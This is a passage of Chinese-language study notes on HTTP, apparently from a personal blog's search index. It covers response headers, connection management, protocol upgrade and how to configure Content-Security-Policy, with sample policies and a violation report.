就是一个对象（比如URL）的标志值，就一个对象而言，比如一个html文件，如果被修改了，其Etag也会别修改，所以，ETag的作用跟Last-Modified的作用差不多，主要供WEB服务器判断一个对象是否改变了。比如前一次请求某个html文件时，获得了其 ETag，当这次又请求这个文件时，浏览器就会把先前获得ETag值发送给WEB服务器，然后WEB服务器会把这个ETag跟该文件的当前ETag进行对比，然后就知道这个文件有没有改变了。</p></blockquote><h6 id="11-Refresh"><a href="#11-Refresh" class="headerlink" title="11.Refresh"></a>11.Refresh</h6><blockquote><p><strong>Refresh: 5; url&#x3D;<a href="http://baidu.com/">http://baidu.com</a></strong> 用于重定向，或者当一个新的资源被创建时。默认会在5秒后刷新重定向。</p></blockquote><h6 id="12-Access-Control-Allow-Origin"><a href="#12-Access-Control-Allow-Origin" class="headerlink" title="12.Access-Control-Allow-Origin"></a>12.Access-Control-Allow-Origin</h6><blockquote><p><strong>Access-Control-Allow-Origin: *</strong>  <em>号代表所有网站可以跨域资源共享，如果当前字段为</em>那么Access-Control-Allow-Credentials就不能为true</p><p>Access-Control-Allow-Origin: <a href="http://www.baidu.com/">www.baidu.com</a> 指定哪些网站可以跨域资源共享</p></blockquote><h6 id="13-Access-Control-Allow-Methods"><a href="#13-Access-Control-Allow-Methods" class="headerlink" title="13.Access-Control-Allow-Methods"></a>13.Access-Control-Allow-Methods</h6><blockquote><p><strong>Access-Control-Allow-Methods：GET,POST,PUT,DELETE</strong> 允许哪些方法来访问</p></blockquote><h6 id="14-Access-Control-Allow-Credentials"><a href="#14-Access-Control-Allow-Credentials" class="headerlink" title="14.Access-Control-Allow-Credentials"></a>14.Access-Control-Allow-Credentials</h6><blockquote><p><strong>Access-Control-Allow-Credentials: true</strong> 是否允许发送cookie。默认情况下，Cookie不包括在CORS请求之中。设为true，即表示服务器明确许可，Cookie可以包含在请求中，一起发给服务器。这个值也只能设为true，如果服务器不要浏览器发送Cookie，删除该字段即可。如果access-control-allow-origin为*，当前字段就不能为true</p></blockquote><h6 id="15-Content-Range"><a href="#15-Content-Range" class="headerlink" title="15.Content-Range"></a>15.Content-Range</h6><blockquote><p><strong>Content-Range: bytes 0-5&#x2F;7877</strong> 指定整个实体中的一部分的插入位置，他也指示了整个实体的长度。在服务器向客户返回一个部分响应，它必须描述响应覆盖的范围和整个实体长度。</p></blockquote><h5 id="概览-1"><a href="#概览-1" class="headerlink" title="概览"></a>概览</h5><ul><li><p>Accept-Ranges：表明服务器是否支持指定范围请求及哪种类型的分段请求。</p></li><li><p>Age：从原始服务器到代理缓存形成的估算时间（以秒计，非负）。</p></li><li><p>Allow：对某网络资源的有效的请求行为，不允许则返回405。</p></li><li><p>Cache-Control：告诉所有的缓存机制是否可以缓存及哪种类型。</p></li><li><p>Content-Encodingweb：服务器支持的返回内容压缩编码类型。。</p></li><li><p>Content-Language：响应体的语言。</p></li><li><p>Content-Length：响应体的长度。</p></li><li><p>Content-Location：请求资源可替代的备用的另一地址。</p></li><li><p>Content-MD5：返回资源的MD5校验值。</p></li><li><p>Content-Range：在整个返回体中本部分的字节位置。</p></li><li><p>Content-Type：返回内容的MIME类型。</p></li><li><p>Date：原始服务器消息发出的时间。</p></li><li><p>ETag：请求变量的实体标签的当前值。</p></li><li><p>Expires：响应过期的日期和时间。</p></li><li><p>Last-Modified：请求资源的最后修改时间。</p></li><li><p>Location：用来重定向接收方到非请求URL的位置来完成请求或标识新的资源。</p></li><li><p>Pragma：包括实现特定的指令，它可应用到响应链上的任何接收方。</p></li><li><p>Proxy-Authenticate：它指出认证方案和可应用到代理的该URL上的参数。</p></li><li><p>refresh：应用于重定向或一个新的资源被创造，在5秒之后重定向（由网景提出，被大部分浏览器支持）</p></li><li><p>Retry-After：如果实体暂时不可取，通知客户端在指定时间之后再次尝试。</p></li><li><p>Serverweb：服务器软件名称。</p></li><li><p>Set-Cookie：设置Http Cookie。</p></li><li><p>Trailer：指出头域在分块传输编码的尾部存在。</p></li><li><p>Transfer-Encoding：文件传输编码。</p></li><li><p>Vary：告诉下游代理是使用缓存响应还是从原始服务器请求。</p></li><li><p>Via：告知代理客户端响应是通过哪里发送的。</p></li><li><p>Warning：警告实体可能存在的问题。</p></li><li><p>WWW-Authenticate：表明客户端请求实体应该使用的授权方案。</p></li></ul><h3 id="HTTP会话过程"><a href="#HTTP会话过程" class="headerlink" title="HTTP会话过程"></a>HTTP会话过程</h3><p>第一步：客户端建立一条 TCP 连接（如果传输层不是 TCP，也可以是其他适合的连接）。</p><p>第二步：客户端发送请求并等待应答。(Resquest)</p><p>第三步：服务器处理请求并送回应答，回应包括一个状态码和对应的数据。(Response)</p><p>从 HTTP&#x2F;1.1 开始，连接在完成第三阶段后不再关闭，客户端可以再次发起新的请求。这意味着第二步和第三步可以连续进行数次。</p><h3 id="HTTP-1-x-的连接管理"><a href="#HTTP-1-x-的连接管理" class="headerlink" title="HTTP&#x2F;1.x 的连接管理"></a>HTTP&#x2F;1.x 的连接管理</h3><p>讨论四种方式：</p><h4 id="Ⅰ-短连接"><a href="#Ⅰ-短连接" class="headerlink" title="Ⅰ.短连接"></a>Ⅰ.短连接</h4><p>HTTP&#x2F;1.0的默认方式，每次会话都要重新建立TCP连接</p><p>建立TCP 连接本身就是耗费时间的，可以保持更多的TCP热连接来适应负载。短连接破坏了 TCP 具备的能力，并且新的冷连接降低了其性能。</p><blockquote><p>这是 HTTP&#x2F;1.0 的默认模型（如果没有指定 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Connection"><code>Connection</code></a> 协议头，或者是值被设置为 <code>close</code>）。而在 HTTP&#x2F;1.1 中，只有当 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Connection"><code>Connection</code></a> 被设置为 <code>close</code> 时才会用到这个模型。</p></blockquote><h4 id="Ⅱ-长连接"><a href="#Ⅱ-长连接" class="headerlink" title="Ⅱ.长连接"></a>Ⅱ.长连接</h4><p>长连接又被称为<strong>keep-alive连接</strong></p><p>长连接会在空闲一段时间后自动关闭（服务器可以使用 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Keep-Alive"><code>Keep-Alive</code></a> 协议头来指定一个最小的连接保持时间）。</p><p>长连接缺点：长连接在空闲状态仍然会消耗服务器资源，而且在重负载时还有可能遭受 <a href="https://developer.mozilla.org/zh-CN/docs/Glossary/DOS_attack">DoS 攻击</a>。这种场景下可以使用非长连接，即尽快关闭那些空闲的连接，也能对性能有所提升。</p><p>注意：</p><blockquote><p>HTTP&#x2F;1.0 里默认并不使用长连接。把 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Connection"><code>Connection</code></a> 设置成 <code>close</code> 以外的其他参数都可以让其保持长连接，通常会设置为 <code>retry-after</code>。</p><p>在 HTTP&#x2F;1.1 里，默认就是长连接的，不再需要标头（但我们还是会把它加上，万一某个时候因为某种原因要退回到 HTTP&#x2F;1.0 呢）。</p></blockquote><h4 id="Ⅲ-流水线"><a href="#Ⅲ-流水线" class="headerlink" title="Ⅲ.流水线"></a>Ⅲ.流水线</h4><p>流水线并发多个请求，在提高性能的同时对服务端的要求提高，并且也存在新的风险。</p><p>附：</p><blockquote><p> HTTP 流水线在现代浏览器中并不是默认被启用的：</p><ul><li>有缺陷的<a href="https://zh.wikipedia.org/wiki/%E4%BB%A3%E7%90%86%E6%9C%8D%E5%8A%A1%E5%99%A8">代理服务器</a>仍然很常见，这些会导致 Web 开发人员无法预见和轻松诊断的奇怪和不稳定行为。</li><li>正确的实现流水线是复杂的：传输中的资源大小、多少有效的 <a href="https://zh.wikipedia.org/wiki/%E4%BE%86%E5%9B%9E%E9%80%9A%E8%A8%8A%E5%BB%B6%E9%81%B2">RTT</a> 会被用到以及有效带宽都会直接影响到流水线提供的改善。不知道这些的话，重要的消息可能被延迟到不重要的消息后面。这个重要性的概念甚至会演变为影响到页面布局！因此 HTTP 流水线在大多数情况下带来的改善并不明显。</li><li>流水线受制于<a href="https://zh.wikipedia.org/wiki/%E9%98%9F%E5%A4%B4%E9%98%BB%E5%A1%9E">队头阻塞（HOL）</a>问题。</li></ul><p> 由于这些原因，流水线已被 HTTP&#x2F;2 中更好的算法——<em>多路复用</em>（multiplexing）所取代。</p></blockquote><h4 id="Ⅳ-域名分块"><a href="#Ⅳ-域名分块" class="headerlink" title="Ⅳ.域名分块"></a>Ⅳ.域名分块</h4><p>须知：</p><blockquote><p> 除非你有紧急而迫切的需求，不要使用这一过时的技术；而是升级到 HTTP&#x2F;2。在 HTTP&#x2F;2 里，做域名分片就没必要了：HTTP&#x2F;2 的连接可以很好的处理并发的无优先级的请求。域名分片甚至会影响性能。大多数 HTTP&#x2F;2 的实现还会使用一种称作<a href="https://daniel.haxx.se/blog/2016/08/18/http2-connection-coalescing/">连接聚合</a>的技术去尝试合并被分片的域名。</p></blockquote><p>简单来说，创建多个通向主域名的附域名，每个域名又有多个连接。如下图：</p><p><img src="/./../../../web%E5%AE%89%E5%85%A8/WEB%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E7%9F%A5%E8%AF%86%E7%AF%87/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/httpsharding.png" alt="Without domain sharding, a client requests six images from a domain with a maximum of two requests taking place in parallel. With domain sharding, the images are available from two domains and the client can run four requests in parallel, downloading the images in less time."></p><h3 id="HTTP协议升级"><a href="#HTTP协议升级" class="headerlink" title="HTTP协议升级"></a>HTTP协议升级</h3><p>简单解释：</p><ol><li>初始状态，较为低级</li><li>由客户端提出升级请求</li><li>协商升级（客户端发送一个请求头部包含 <code>Upgrade: websocket</code>，表示想要升级到 WebSocket 协议，服务端同意升级）</li><li>升级成功，切换到一个新的协议（如 WebSocket）</li></ol><h2 id="HTTP安全"><a href="#HTTP安全" class="headerlink" title="HTTP安全"></a>HTTP安全</h2><h3 id="内容安全策略-CSP"><a href="#内容安全策略-CSP" class="headerlink" title="内容安全策略(CSP)"></a><strong>内容安全策略(CSP)</strong></h3><h4 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h4><p>Content-Security-Policy，是一个额外的安全层，用于检测并削弱一些特定的攻击，如XSS(跨站脚本攻击)，数据注入攻击等等。</p><p>为使 CSP 可用，需要配置网络服务器返回 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Security-Policy"><code>Content-Security-Policy</code></a> HTTP 标头（X-Content-Security-Policy&#96; 标头是旧版本的，无须再如此指定）。</p><p>除此之外，<meta>元素也可以被用来配置该策略，例如</p><figure class="highlight csp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta</span><br><span class="line">  http-equiv=&quot;Content-Security-Policy&quot;</span><br><span class="line">  content=&quot;<span class="keyword">default-src</span> <span class="string">&#x27;self&#x27;</span>; <span class="keyword">img-src</span> https://*; <span class="keyword">child-src</span> <span class="string">&#x27;none&#x27;</span>;&quot; /&gt;</span><br></pre></td></tr></table></figure><h4 id="可缓解的威胁"><a href="#可缓解的威胁" class="headerlink" title="可缓解的威胁"></a>可缓解的威胁</h4><p>缓解跨站脚本攻击(XSS)</p><blockquote><p>CSP 的主要目标是减少和报告 XSS 攻击。XSS 攻击利用了浏览器对于从服务器所获取的内容的信任。恶意脚本在受害者的浏览器中得以运行，因为浏览器信任其内容来源，即使有的时候这些脚本并非来自于它本该来的地方。</p></blockquote><p>CSP制定了一个白名单域(制定白名单是一个好习惯)，一个CSP兼容的浏览器仅会执行从白名单域获取到的脚本文件，其余的忽略。</p><p>缓解数据包嗅探攻击</p><blockquote><p>除限制可以加载内容的域，服务器还可指明哪种协议允许使用；比如（从理想化的安全角度来说），服务器可指定所有内容必须通过 HTTPS 加载。一个完整的数据安全传输策略不仅强制使用 HTTPS 进行数据传输，也为所有的 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Cookies">cookie 标记 <code>secure</code> 标识</a>，并且提供自动的重定向使得 HTTP 页面导向 HTTPS 版本。网站也可以使用 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Strict-Transport-Security"><code>Strict-Transport-Security</code></a> HTTP 标头确保连接它的浏览器只使用加密通道。</p></blockquote><p>通过导向HTTPS进而避免数据包嗅探攻击。</p><h4 id="使用CSP"><a href="#使用CSP" class="headerlink" title="使用CSP"></a>使用CSP</h4><h5 id="制定策略："><a href="#制定策略：" class="headerlink" title="制定策略："></a>制定策略：</h5><p>使用 <strong>Content-Security-Policy</strong> HTTP 标头来指定策略，如下：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-<span class="keyword">Security</span>-<span class="keyword">Policy</span>: <span class="keyword">policy</span></span><br></pre></td></tr></table></figure><p>策略（policy）参数是一个包含了各种描述你的 CSP 策略指令的字符串。</p><h5 id="编写策略："><a href="#编写策略：" class="headerlink" title="编写策略："></a>编写策略：</h5><p>策略由一系列策略指令所组成，每个策略指令都描述了针对某个特定资源的类型以及策略生效的范围。策略应当包含一个<strong>default-src</strong>策略指令，在其他资源类型没有符合自己的策略时应用该策略。</p><h5 id="对策略进行测试："><a href="#对策略进行测试：" class="headerlink" title="对策略进行测试："></a>对策略进行测试：</h5><p>使用 <strong>Content-Security-Policy-Report-Only</strong> HTTP 标头来指定策略，如下：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-<span class="keyword">Security</span>-<span class="keyword">Policy</span>-Report-<span class="keyword">Only</span>: <span class="keyword">policy</span></span><br></pre></td></tr></table></figure><p>附：</p><blockquote><p>如果 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Security-Policy-Report-Only"><code>Content-Security-Policy-Report-Only</code></a> 标头和 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Security-Policy"><code>Content-Security-Policy</code></a> 同时出现在一个响应中，两个策略均有效。在 <code>Content-Security-Policy</code> 标头中指定的策略有强制性，而 <code>Content-Security-Policy-Report-Only</code> 中的策略仅产生报告而不具有强制性。</p></blockquote><h5 id="启用报告："><a href="#启用报告：" class="headerlink" title="启用报告："></a>启用报告：</h5><p>默认情况下不发送报告，需要指定<strong>report-to</strong>策略指令，并提供至少一个URI地址以递交报告，如下：</p><figure class="highlight csp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Security-Policy</span>: <span class="keyword">default-src</span> <span class="string">&#x27;self&#x27;</span>; <span class="keyword">report-uri</span> http://reportcollector.example.com/collector.cgi</span><br></pre></td></tr></table></figure><p>然后需要设置服务器能够接收报告；使其能够以恰当的方式存储并处理这些报告。</p><h5 id="违规报告的语法："><a href="#违规报告的语法：" class="headerlink" title="违规报告的语法："></a>违规报告的语法：</h5><h6 id="1-blocked-uri"><a href="#1-blocked-uri" class="headerlink" title="1.blocked-uri"></a>1.blocked-uri</h6><blockquote><p>被 CSP 阻止的资源 URI。如果被阻止的 URI 来自不同的源而非 <code>document-uri</code>，那么被阻止的资源 URI 会被删减，仅保留协议、主机和端口号。</p></blockquote><h6 id="2-disposition"><a href="#2-disposition" class="headerlink" title="2.disposition"></a>2.disposition</h6><blockquote><p>根据 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Security-Policy-Report-Only"><code>Content-Security-Policy-Report-Only</code></a> 和 <code>Content-Security-Policy</code> 标头使用情况的不同，值为 <code>&quot;enforce&quot;</code> 或 <code>&quot;report&quot;</code>。</p></blockquote><h6 id="3-document-uri"><a href="#3-document-uri" class="headerlink" title="3.document-uri"></a>3.document-uri</h6><p>发生违规文档的URI</p><h6 id="4-effective-directive"><a href="#4-effective-directive" class="headerlink" title="4.effective-directive"></a>4.effective-directive</h6><blockquote><p>导致违规行为发生的指令。一些浏览器可能提供不同的值，例如 Chrome 提供 <code>style-src-elem</code> 或 <code>style-src-attr</code>，即使实际执行的指令是 <code>style-src</code>。</p></blockquote><h6 id="5-original-policy"><a href="#5-original-policy" class="headerlink" title="5.original-policy"></a>5.original-policy</h6><p>由 <strong>Content-Security-Policy</strong> HTTP 标头指定的原始策略值。</p><h6 id="6-referer"><a href="#6-referer" class="headerlink" title="6.referer"></a>6.referer</h6><p>违规发生的地址</p><h6 id="7-script-sample"><a href="#7-script-sample" class="headerlink" title="7.script-sample"></a>7.script-sample</h6><blockquote><p>导致该违规的内联代码、事件处理器或样式的前 40 个字符。只适用于 <code>script-src*</code> 或 <code>style-src*</code> 包含 <code>&#39;report-sample&#39;</code> 的情况。</p></blockquote><h6 id="8-status-code"><a href="#8-status-code" class="headerlink" title="8.status-code"></a>8.status-code</h6><p>全局对象被实例化的资源的 HTTP 状态代码。</p><h6 id="9-violated-directive"><a href="#9-violated-directive" class="headerlink" title="9.violated-directive"></a>9.violated-directive</h6><blockquote><p>导致违反策略的指令。<code>violated-directive</code> 是 <code>effective-directive</code> 字段的历史名称，并包含相同的值。</p></blockquote><h5 id="违规报告的样本："><a href="#违规报告的样本：" class="headerlink" title="违规报告的样本："></a>违规报告的样本：</h5><p>页面位于<a href="http://example.com/signup.html%EF%BC%8C%E5%81%87%E8%AE%BE%E6%9C%89%E5%A6%82%E4%B8%8B%E7%AD%96%E7%95%A5%EF%BC%9A">http://example.com/signup.html，假设有如下策略：</a></p><figure class="highlight csp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Security-Policy</span>: <span class="keyword">default-src</span> <span class="string">&#x27;none&#x27;</span>; <span class="keyword">style-src</span> cdn.example.com; <span class="keyword">report-uri</span> /_/csp-reports</span><br></pre></td></tr></table></figure><p>在样本HTML文档中：</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;link rel<span class="operator">=</span><span class="string">&quot;stylesheet&quot;</span> href<span class="operator">=</span><span class="string">&quot;css/style.css&quot;</span> /&gt;</span><br></pre></td></tr></table></figure><blockquote><p>这里仅允许加载自 <code>cdn.example.com</code> 的样式表，然而该页面企图从自己的源（<code>http://example.com</code>）加载。当该文档被访问时，一个兼容 CSP 的浏览器将以 POST 请求的形式发送违规报告到 <code>http://example.com/_/csp-reports</code>，内容如下：</p></blockquote><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;csp-report&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;blocked-uri&quot;</span><span class="punctuation">:</span> <span class="string">&quot;http://example.com/css/style.css&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;disposition&quot;</span><span class="punctuation">:</span> <span class="string">&quot;report&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;document-uri&quot;</span><span class="punctuation">:</span> <span class="string">&quot;http://example.com/signup.html&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;effective-directive&quot;</span><span class="punctuation">:</span> <span class="string">&quot;style-src-elem&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;original-policy&quot;</span><span class="punctuation">:</span> <span class="string">&quot;default-src &#x27;none&#x27;; style-src cdn.example.com; report-to /_/csp-reports&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;referrer&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;status-code&quot;</span><span class="punctuation">:</span> <span class="number">200</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;violated-directive&quot;</span><span class="punctuation">:</span> <span class="string">&quot;style-src-elem&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><hr><h1 id=""><a href="#" class="headerlink" title=""></a></h1>]]></content>
      
      
      <categories>
          
          <category> HTTP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 入门 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
